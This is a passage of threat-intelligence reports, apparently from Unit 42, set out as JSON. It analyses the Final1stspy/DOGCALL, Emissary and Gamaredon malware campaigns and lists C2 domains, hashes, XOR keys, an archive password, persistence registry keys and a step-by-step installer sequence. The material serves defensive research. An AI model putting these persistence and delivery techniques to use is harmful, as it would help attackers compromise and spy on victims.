            "content": [
                "The commented lure and payload used by the malware provides an interesting detail given that DOGCALL has been attributed to the threat actor group known as Reaper, which has been attributed to North Korea by other security organizations."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Continuing Execution of the Malware"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After the initial execution of World Cup predictions.doc is run, it proceeds to download a VBScript file from the following URL:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This VBScript file yet again contains the exact same unique deobfuscation routine that was previously discussed.",
                "When this second stage VBScript file executes, it begins by writing the following data to %APPDATA%\\Microsoft\\mib.dat.",
                "This file will later be used by the Final1stspy malware family, which we discuss later in this post."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1111:rom*E8FEF0CDF6C1EBBA90794B2B"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After this file is written, it will execute the following (deobfuscated):"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This executed code simply downloads two files from http:// kmbr1.nitesbr1[.]org/UserFiles/File/images/happy.jpg and http:// kmbr1.nitesbr1[.]org/UserFiles/File/images/wwwtest.jpg and stores them in %APPDATA%/Microsoft/Windows/msvcrt32.dll and %APPDATA%/Microsoft/ieConv.exe, respectively.",
                "Finally, the VBScript file will execute the previously downloaded ieConv.exe file in a new process."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "These two files are instances of a previously unreported dropper malware family that we are calling Final1stspy."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Overview of Final1stspy"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As previously stated, the Final1stspy malware family is split between an executable file and a DLL.",
                "These files have the following properties (Note: the DLL information is provided after it is decrypted by the malware):"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As we can see, both samples were compiled within a couple weeks of each other.",
                "Additionally, the original Microsoft Word document used to deliver this malware was last modified roughly a day before the DLL was compiled."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Both the executable and DLL make use of a specific routine to obfuscate strings of importance.",
                "The following code, written in Python, decodes these strings:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Final1stspy malware begins by looking for the presence of the following file:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Should this file be present, the malware will load the DLLs and attempt to call the exported main_func function."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Otherwise, the malware will look for the following file:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the event this file is present, the malware will decrypt this file by XORing it against 0x50, write it to the previously mentioned msvcrt64.dll path, and load the main_func function."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This DLL uses the same string obfuscation routine witnessed in the executable.",
                "It begins by collecting basic system information and ensuring persistence by setting the following registry key to point to %APPDATA%/Microsoft/ieConv.exe:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\rundll32"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Final1stspy malware family continues to read and parse the previously written mib.dat file.",
                "The data is parsed to eventually be used in subsequent HTTP GET requests, representing the Index, Account, and Group variables."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Final1stspy has the ability to read in a %APPDATA%/Microsoft/olevnc.ini file that has several variables stored within it, such as the user-agent, URL, port, and interval counts.",
                "In the event this file is not present, such as in our given situation, the malware will default to a hardcoded user-agent and URL.",
                "This particular sample communicates with http://kmbr1.nitesbr1[.]org/UserFiles/File/image/index.php with a user-agent of Host Process Update."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware proceeds to make a HTTP GET request to the URL, such as the following example:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 HTTP request made by Final1stspy malware family"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following GET parameters are present in this request:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware expects to receive a payload that will subsequently be decrypted using a single-byte XOR key of 0x49.",
                "This payload will be loaded on the victim machine.",
                "After decryption, the following payload was identified:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As we can see by the compile timestamp above, this file appears to have been compiled close to the Final1stspy executable.",
                "This payload has been identified as belonging to the DOGCALL malware family.",
                "It is able to perform the following actions on the victim:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware uploads the stolen data to third-party cloud storage providers.",
                "The sample identified in the wild is configured to upload to pCloud, but functionality to upload to Dropbox, Box and Yandex Cloud is also included."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Conclusion"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "What originally began as research surrounding a new malware family named NOKKI that had code overlap and other ties to KONNI lead us to an interesting discovery tying the NOKKI malware family to the Reaper threat actor group.",
                "There are some curious aspects to this relationship, such as commented out North Korean-related lure information and DOGCALL malware payload.",
                "Additionally, we discovered yet another malware family that has not been previously publicly reported that we have named Final1stspy."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unit 42 will continue to monitor this threat and report on any updates encountered in the future.",
                "Palo Alto Networks customers are protected against this threat in the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Indicators of Compromise"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "World Cup predictions Sample"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "66a0c294ee8f3507d723a376065798631906128ce79bd6dfd8f025eda6b75e51"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Final1stspy Samples"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0669c71740134323793429d10518576b42941f9eee0def6057ed9a4ba87a3a9a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "fb94a5e30de7afd1d9072ccedd90a249374f687f16170e1986d6fd43c143fb3a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "DOGCALL Samples"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3fee068bf90ffbeb25549eb52be0456609b1decfe91cda1967eb068ef2c8918f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Infrastructure"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "kmbr1.nitesbr1[.]org"
            ]
        }
    ],
    "2874b6e5139ff8cb13c720b72350e0fb03506dc6": [
        {
            "type": "paragraph",
            "content": [
                "We observed a targeted attack in November directed at an individual working for the French Ministry of Foreign Affairs.",
                "The attack involved a spear-phishing email sent to a single French diplomat based in Taipei, Taiwan and contained an invitation to a Science and Technology support group event."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The actors attempted to exploit CVE-2014-6332 using a slightly modified version of the proof-of-concept (POC) code to install a Trojan called Emissary, which is related to the Operation Lotus Blossom campaign.",
                "The TTPs used in this attack also match those detailed in the paper.",
                "The targeting of this individual suggests the actors are interested in breaching the French Ministry of Foreign Affairs itself or gaining insights into relations between France and Taiwan."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We have created the Emissary tag for AutoFocus users to track this threat."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "On November 10, 2015, threat actors sent a spear-phishing email to an individual at the French Ministry of Foreign Affairs.",
                "The subject and the body of the email suggest the targeted individual had been invited to a Science and Technology conference in Hsinchu, Taiwan.",
                "The e-mail appears quite timely, as the conference was held on November 13, 2015, which is three days after the attack took place."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The email body contained a link to the legitimate registration page for the conference, but the email also had two attachments with the following filenames that also pertain to the conference:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Both attachments are malicious Word documents that attempt to exploit the Windows OLE Automation Array Remote Code Execution Vulnerability tracked by CVE-2014-6332.",
                "Upon successful exploitation, the attachments will install a Trojan named Emissary and open a Word document as a decoy."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The first attachment opens a decoy (Figure 2) that is a copy of an invitation to a Science and Technology conference this past November 13th held in Hsingchu, Taiwan, while the second opens a decoy (Figure 1) that is a registration form to attend the conference.",
                "The conference was widely advertised online and on Facebook, however in this case the invitation includes a detailed itinerary that does not seem to have appeared online.",
                "The Democratic Progressives Party (DPP) Chairwoman Tsai Ing-wen and DPP caucus whip and Hsinchu representative Ker Chien-ming were the primary political sponsors of the conference and are longtime political allies.",
                "Tsai Ing-wen is the current front-runner for the Taiwanese Presidency and Ker Chien-ming may become Speaker if she wins.",
                "The conference focused on using open source technology, open international recruiting, and partnerships to continue developing Hsinchu as the Silicon Valley of Taiwan.",
                "It particularly noted France as an ally in this, and France is Taiwans second largest technology partner and fourth largest trading partner in Europe."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Decoy document containing written application form"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Decoy document containing the invitation and agenda for event"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The threat actors attempted to exploit CVE-2014-6332 using the POC code available in the wild.",
                "The POC code contains inline comments that explain how the malicious VBScript exploits this vulnerability, so instead of discussing the malicious script or exploit itself, we will focus on the portions of the script that the threat actors modified."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The actors removed the explanatory comments from the VBScript and made slight modifications to the POC code.",
                "The only major functional difference between the POC and the VBScript involved adding the ability to extract and run both a decoy document and payload.",
                "Figure 3 and 4 compare the differing runshell command within the POC and the malicious documents used in this attack.",
                "The code in Figure 3 shows that the POC does nothing more than launch the notepad.exe application upon successful exploitation.",
                "Figure 4 shows the malicious document creating a file named ss.vbs that it writes a VBScript to using a series of echo statements.",
                "After writing the VBScript, the malicious document executes the ss.vbs file."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 Code block containing \u201crunshell\u201d function in CVE-2014-6332 proof-of-concept VBScript"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 Code block containing \"runshell\" function in malicious VBScript within attachment"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The ss.vbs file is responsible for locating the payload and decoy document from the initial malicious document, as well as decrypting, saving and opening both of the files.",
                "The script has hardcoded offsets to the location of both the payload and decoy document within the initial document.",
                "The script will decrypt both of the embedded files using a two-byte XOR loop that skips the first byte and then decrypts the remaining using A and C as the key.",
                "After decrypting the embedded files, the script saves the decoy to t.doc and the payload to mm.dll in the %APPDATA%\\LocalData folder.",
                "Finally, the script will open the decoy document and launch the payload by calling its exported function named Setting."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5 VBScript within ss.vbs responsible for extracting and running the payload and decoy"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload of this attack is a Trojan that we track with the name Emissary.",
                "This Trojan is related to the Elise backdoor described in the Operation Lotus Blossom report.",
                "Both Emissary and Elise are part of a malware group referred to as LStudio, which is based on the following debug strings found in Emissary and Elise samples:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d:\\lstudio\\projects\\worldclient\\emissary\\Release\\emissary\\i386\\emissary.pdb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d:\\lstudio\\projects\\lotus\\elise\\Release\\EliseDLL\\i386\\EliseDLL.pdb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "There is code overlap between Emissary and Elise, specifically in the use of a common function to log debug messages to a file and a custom algorithm to decrypt the configuration file.",
                "The custom algorithm used by Emissary and Elise to decrypt their configurations use the srand function to set a seed value for the rand function, which the algorithm uses to generate a key.",
                "While the rand function is meant to generate random numbers, the malware author uses the srand function to seed the rand function with a static value.",
                "The static seed value causes the rand function to create the same values each time it is called and results in a static key to decrypt the configuration.",
                "The seed value is where the Emissary and Elise differ in their use of this algorithm, as Emissary uses a seed value of 1024 (as seen in Figure 6) and Elise uses the seed value of 2012."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6 Custom algorithm in Emissary using 'srand' and 'rand' with 1024 as a seed value"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While these two Trojans share code, we consider Emissary and Elise separate tools since their configuration structure, command handler and C2 communications channel differ.",
                "The Emissary Trojan delivered in this attack contains the components listed in Table 1.",
                "At a high level, Emissary has an initial loader DLL that extracts a configuration file and a second DLL containing Emissarys functional code that it injects into Internet Explorer."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1 Dropped files associated with Emissary Trojan seen in attack on French Ministry of Foreign Affairs"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The loader Trojan named ishelp.dll had an original name of Loader.dll, which will extract the Emissary payload from a resource named \"asdasdasdasdsad\" and write it to a file named A08E81B411.DAT.",
                "The loader will then write an embedded configuration to a file named 75BD50EC.DAT.",
                "The loader Trojan creates a mutex named _MICROSOFT_LOADER_MUTEX_ and finishes by injecting the Emissary DLL in A08E81B411.DAT into a newly spawned Internet Explorer process."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Emissary Trojan runs within the Internet Explorer process.",
                "It begins by reading and decrypting its configuration file, which has the following structure:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We decrypted and parsed the configuration file that accompanied the payload used in this attack, which resulted in the following settings:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Version: 5.3\nGUID: ba87c1c5-f71c-4a8b-b511-07aa113d9103\nC2 Server 1: http://ustar5.PassAs[.]us/default.aspx\nC2 Server 2: http://203.124.14.229/default.aspx\nC2 Server 3: http://dnt5b.myfw[.]us/default.aspx\nCampaign Code: UPG-ZHG-01\nSleep Delay: 300"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After decrypting the configuration file, Emissary interacts with its command and control (C2) servers using HTTP or HTTPS, depending on the protocol specified in the configuration file.",
                "The initial network beacon sent from Emissary to its C2 server, seen in Figure 7, includes a Cookie field that contains a GUID, op and SHO field.",
                "The GUID field is a unique identifier for the compromised system that is obtained directly from the configuration file.",
                "The op field has a value of 101, which is a static value that represents the initial network beacon.",
                "The SHO field contains the external IP address of the infected system, which Emissary obtains from a legitimate website showip.net, specifically parsing the websites response for <input id=\"checkip\" type=\"text\" name=\"check_ip\" value=, which contains the IP address of the system."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7 Network beacon sent from Emissary Trojan to C2 server"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The C2 server response to this beacon (seen in Figure 8) will contain a header field called Set-Cookie, which contains a value of SID.",
                "The SID value is base64 encoded and encrypted using a rolling XOR algorithm, which once decoded and decrypted contains a 36-character GUID value.",
                "The Emissary Trojan will use this GUID value provided by the C2 server as an encryption key that it will use to encrypt data sent in subsequent network communications."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 8 C2 response to Emissary beacon"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The C2 server provides commands to the Trojan as a three digit numeric string within the data portion of the HTTP response (in the form of op=<command>), which the Emissary Trojan will decrypt and compare to a list of commands within its command handler.",
                "The command handler function within the Emissary Trojan supports six commands, as seen in Table 2."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 2 Command handler within Emissary version 5.3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the command issued from the C2 server does not match the one listed in the Trojan saves the message \"unkown:%s\"to the log file.",
                "The command set available within Emissary allows the threat actors backdoor access to a compromised system.",
                "Using this access, the threat actors can exfiltrate data and carry out further activities on the system, including interacting directly with the systems command shell and downloading and executing additional tools for further functionality."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The infrastructure associated with the Emissary C2 servers used in this attack includes ustar5.PassAs[.]us, 203.124.14.229 and dnt5b.myfw[.]us.",
                "The infrastructure is rather isolated as the only overlap in domains includes appletree.onthenetas[.]com.",
                "The overlap, as seen in Figure 9 involves two IP addresses that during the same time frame resolved both the appletree.onthenetas[.]com domain and the Emissary C2 domain of ustar5.PassAs[.]us.",
                "The other C2 domain used by this Emissary payload, specifically dnt5b.myfw[.]us currently resolves to the 127.0.0.1.",
                "This provides another glimpse into TTPs for these threat actors, as it suggests that the threat actors set the secondary C2 domains to resolve to the localhost IP address to avoid network detection and change this to a routable IP address when they need the C2 server operational.",
                "Additionally, while this infrastructure does not overlap with that used in Operation Lotus Blossom, that also fits with the TTPs.",
                "In each case, the threat actors used separate infrastructure for different targets, another way to help avoid detection."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 9 Infrastructure associated with Emissary Trojan"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "APT threat actors, most likely nation state-sponsored, targeted a diplomat in the French Ministry of Foreign Affairs with a seemingly legitimate invitation to a technology conference in Taiwan.",
                "It is entirely possible the diplomat was truly invited to the conference, or at least would not have been surprised by the invitation, adding to the likelihood the attachment would have been opened.",
                "The actors were attempting to exploit CVE-2014-6332 to install a new version of the Emissary Trojan, specifically version 5.3."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Emissary Trojan is related to the Elise malware used in Operation Lotus Blossom, which was an attack campaign on targets in Southeast Asia, in many cases also with official looking decoy documents that do not appear to have been available online.",
                "Additionally, the targeting of a French diplomat based in Taipei, Taiwan aligns with previous targeting by these actors, as does the separate infrastructure.",
                "Based on the targeting and lures, Unit 42 assesses that the threat actors collection requirements not only include militaries and government agencies in Southeast Asia, but also nations involved in diplomatic and trade agreements with them."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Related Hashes\n748feae269d561d80563eae551ef7bfd -.doc\n9fd6f702763a9840bd1b3a898eb9c62d -.doc\n06f1d2be5e981dee056c231d184db908 - ishelp.dll\n6278fc8c7bf14514353797b229d562e8 - A08E81B411.DAT\ne9f51a4e835929e513c3f30299567abc - 75BD50EC.DAT"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Command and Control\n203.124.14.229\nustar5.PassAs[.]us\nappletree.onthenetas[.]com\ndnt5b.myfw[.]us"
            ]
        }
    ],
    "d0a700dbeb1532e881629ae2a907d90048177c65": [
        {
            "type": "paragraph",
            "content": [
                "Unit 42 threat researchers have recently observed a threat group distributing new, custom developed malware.",
                "We have labelled this threat group the Gamaredon Group and our research shows that the Gamaredon Group has been active since at least 2013."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the past, the Gamaredon Group has relied heavily on off-the-shelf tools.",
                "Our new research shows the Gamaredon Group have made a shift to custom-developed malware.",
                "We believe this shift indicates the Gamaredon Group have improved their technical capabilities.",
                "The custom-developed malware is fully featured an includes these capabilities:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Gamaredon Group primarily makes use of compromised domains, dynamic DNS providers, Russian and Ukrainian country code top-level domains (ccTLDs), and Russian hosting providers to distribute their custom-built malware."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Antimalware technologies have a poor record of detecting the malware this group has developed.",
                "We believe this is likely due to the modular nature of the malware, the malwares heavy use of batch scripts, and the abuse of legitimate applications and tools (such as wget) for malicious purposes."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Previously, LookingGlass reported on a campaign they named \"Operation Armageddon,\" targeting individuals involved in the Ukrainian military and national security establishment.",
                "Because we believe this group is behind that campaign, weve named them the Gamaredon Group, an anagram of Armageddon.",
                "At this time, it is unknown if the new payloads this group is distributing is a continuation of Operation Armageddon or a new campaign."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The earliest discovered sample (based on compile times and sandbox submission times) distributed by this threat group resembles the descriptions of Gamaredon provided by Symantec and Trend Micro.",
                "Unfortunately, this identification is rather tenuous, as it seems to only identify the first variant of payloads used by our threat actors.",
                "Some samples of later payload variants also have been given the generic and brittle names of TROJ_RESETTER.BB and TROJ_FRAUDROP.EX."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Originally, the payloads delivered to targets by this threat group consisted of a password protected Self-extracting Zip-archive (.SFX) file which, when extracted, wrote a batch script to disk and installed a legitimate remote administration tool called tool Remote Manipulator System (Figure 1) which they would abuse for malicious purposes."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Remote Manipulator System Interface"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "One such self-extracting archive (ca87eb1a21c6d4ffd782b225b178ba65463f73de6f4c736eb135be5864f556dc) was first observed around April of 2014.",
                "The password (reused by many of the password protected SFX payloads) it used to extract itself is 1234567890__.",
                "The files included in this SFX file we observed include a batch file named 123.cmd and another SFX named setting.exe.",
                "This second SFX contains a .MSI installer package which installs Remote Manipulator System and a batch script which handles the installation."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Later payloads would write batch scripts to disk as well as wget binaries.",
                "The batch scripts would use the wget binaries to download and execute additional executables.",
                "The scripts would also use wget to send POST requests to command and control (C2) servers that would contain information about the compromised system.",
                "Some of these payloads included decoy documents that would open when the malware is executed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Three examples of this type of payload include:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We first observed these samples using wget in 2014.",
                "The filenames and decoy documents these samples used attempt to lure individuals by using the presidential administration of Ukraine, Ukrainian national security and defense, the Anti-",
                "Terrorist Operation Zone in the Ukraine, and Ukrainian patriotism as subjects.",
                "The text of one such decoy document is pictured below."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Ukrainian Decoy Document used by Gamaredon Group"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Other observed payloads would, again, use SFX files to deliver a batch script and an executable that allowed remote access through the VNC protocol.",
                "These VNC exectuables would either be included in the SFX file or downloaded by the batch script.",
                "We found one URL (now taken down) that hosted a VNC executable that the malware would attempt to download and install at hxxp://prestigeclub.frantov.com[.]ua/press-center/press/chrome-xvnc-v5517.exe."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The batch script would then attempt to have the VNC program connect to a command and control (C2) server to enable the server to control the compromised system.",
                "All VNC installations on compromised systems that we observed have used the same configuration file, RC4 key file, and passwords."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "One such sample, cfb8216be1a50aa3d425072942ff70f92102d4f4b155ab2cf1e7059244b99d31 first appeared around January of 2015.",
                "The batch script utilized in this sample ensures a VNC connection is available:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The path configured in the VNC configuration file across all implants employing VNC (UltraVNC.ini) is Y:\\\\ \\ RMS\\vnc.",
                "This isnt the only place hardcoded Cyrillic file paths are used by implants.",
                "Many of the batch scripts also use hardcoded paths such as  \\\\. Many payloads also include a VBS script which raises a dialog box to the users asking them to run the malware again.",
                "It reads,     (0xc0000005).    ?",
                "(English Translation from Russian: Application failed to initialize (0xc0000005).",
                "Try to open the file again?)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Some of the SFX files also include another legitimate application called ChkFlsh.exe",
                "(8c9d690e765c7656152ad980edd2200b81d2afceef882ed81287fe212249f845).",
                "This application was written by a Ukrainian programmer and is used to check performance of USB flash drives.",
                "Its value to the attackers to the attackers isnt clear but one possibility is that it is somehow used to steal or monitor files on USB devices.",
                "In our research, we found this application present in some SFX files along with VNC programs and in some SFX files that didnt have VNC programs included."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While the most recent samples observed still use batch scripts and SFX files, the Gamaredon Group has moved away from applications like wget, Remote Manipulator Tool, VNC and ChkFlsh.exe.",
                "Instead of using wget the attackers are distributing custom developed downloaders, and instead of Remote Manipulator or VNC the malware is using a custom developed remote access implant."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In June of 2015 a custom downloader used by many newer samples was first seen in the wild and is often included in SFX implants with the name LocalSMS.dll.",
                "This downloader makes requests to adobe.update-service[.]net (hardcoded in the sample) and is further discussed in Appendix A."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In February 2016, another custom tool now often included in SFX implants was seen in the wild.",
                "This SFX file (3773ddd462b01f9272656f3150f2c3de19e77199cf5fac1f44287d11593614f9) contains a new Trojan (598c55b89e819b23eac34547ad02e5cd59e1b8fcb23b5063a251d8e8fae8b824) we refer to as Pteranodon.",
                "Pteranodon is a custom backdoor which is capable of the following tasks:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The earliest version of Pteranodon uses a hardcoded URL for command and control.",
                "It sends POST requests to msrestore[.]ru/post.php using a static multipart boundary:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "------------870978B0uNd4Ry_$"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Newer versions of the tool also use hardcoded domains and multipart boundaries.",
                "They also share similar pdb strings.",
                "Other Pteranodon samples can be found in AutoFocus using the Pteranodon tag.",
                "The most recent variant of Pteranodon is analyzed in Appendix A."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We have only identified one delivery vector for the new implants thus far.",
                "A Javascript file (f2355a66af99db5f856ebfcfeb2b9e67e5e83fff9b04cdc09ac0fabb4af556bd) first seen in December of 2016 downloads a resource from http://samotsvety.com[.]ua/files/index.pht (likely a compromised site used for staging payloads) which previously an SFX file (b2fb7d2977f42698ea92d1576fdd4da7ad7bb34f52a63e4066f158a4b1ffb875) containing two of the Gamaredon custom tools."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A related sample (e24715900aa5c9de807b0c8f6ba8015683af26c42c66f94bee38e50a34e034c4) used the same distinct Mutex and contains a larger set of tools for analysis.",
                "The original name of the file is \"AdapterTroubleshooter.exe\" and the file uses icons which resemble those used by OpenVPN, as seen below."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Upon examining the sample's file activity within AutoFocus it is clear the sample is a self-extracting executable."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 Self Extracting executable behavior shown in AutoFocus"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Opening the sample with 7zip inside of a virtual machine, all the files contents can be examined.",
                "Below is a table providing the SHA256 values, the filenames, the compile timestamps and the pdb paths of the contents of the SFX file."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The bootstrapping logic for the sample relies on the contents of \"condirs.cmd\".",
                "Briefly, the logic within \"condirs.cmd\" follows:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1. Ensure \"%LOCALAPPDATA%\\Microsoft\\Windows\\\" exists\n2. Kill and delete processes, files, and scheduled tasks which may interfere with the sample executing\n3. Copy \"winrestore.dll\" to \"%LOCALAPPDATA%\\Microsoft\\Windows\\UsrClass.dat{4f6fe187-7034-11de-b675-001d09fa5win}.dll\"\n4. Copy \"OfficeUpdate.dll\" to \"%LOCALAPPDATA%\\Microsoft\\Windows\\UsrClass.dat{4f6fe187-7034-11de-b675-001d09fa5off}.dll\"\n5. Determine if the operating system is Windows XP or Windows 7\n6.",
                "If the system is running Windows XP"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a. Set the directory to copy files into as \"%WINDIR%\\Setup\\State\\Office\"\nb. Copy \"UsrClass.lnk\" to \"%USERPROFILE%\\ \\\\\\\"\nc. Copy \"SmartArtGraphicsLog.lnk\" to \"%USERPROFILE%\\ \\\\\\\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7.",
                "If the system is running Windows 7"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a. Set the directory to copy files into as \"%APPDATA%\\Microsoft\\Office\"\nb. Copy \"UsrClass.lnk\" to \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\nc. Copy \"SmartArtGraphicsLog.lnk\" to \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\""
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 Windows XP and Windows 7 logic within \"condirs.cmd\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8.",
                "Copy \"winrestore.dll\" to the directory set in step 6 or 7a with the filename \"MSO1234.win\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9. copy \"LocalSMS.dll\" to the directory set in step 6 or 7a with the filename \"MSO1567.dls\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "10.",
                "copy \"OfficeUpdate.dll\" to the directory set in step 6 or 7a with the filename \"MSO5678.usb\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "11.",
                "copy \"MpClients.dll\" to the directory set in step 6 or 7a with the filename \"MSO8734.obn\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "12.",
                "Execute the exported function \"updater\" within \"MSO1234.win\" using rundll32.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "13.",
                "Execute the exported function \"EntryPoint\" within \"MSO1567.dls\" using rundll32.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It should be noted that \"UsrClass.lnk\" links to \"%WINDIR%\\system32\\rundll32.exe UsrClass.dat{4f6fe187-7034-11de-b675-001d09fa5win}.dll,updater\" and \"SmartArtGraphicsLog.lnk\" links to \"C:\\WINDOWS\\system32\\rundll32.exe UsrClass.dat{4f6fe187-7034-11de-b675-001d09fa5off}.dll,StartBackup\".",
                "These are the locations \"winrestore.dll\" and \"OfficeUpdate.dll\" were copied to in steps 3 and 4, respectively."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The \"condirs.cmd\" script then continues to:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1.",
                "Schedule the following tasks:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a. Task name \"UpdatesWinRes\", invoke \"MSO1234.win,updater\"\nb. Task name \"UpdatesWinDLL\", invoke \"MSO1567.dls,EntryPoint\"\nc. Task name \"UpdatesWinUSBOOK\", invoke \"MSO5678.usb,StartBackup\"\nd. Task name \"UpdatesWinOBN\", invoke \"MSO8734.obn,bitDefender\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2.Ensure the directory \"%Temp%\\reports\\ProfileSkype\\\" exists"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3.Kill processes named \"skype.exe\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4.Copy the contents of \"%AppData%\\Skype\" to \"%Temp%\\reports\\ProfileSkype\\\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
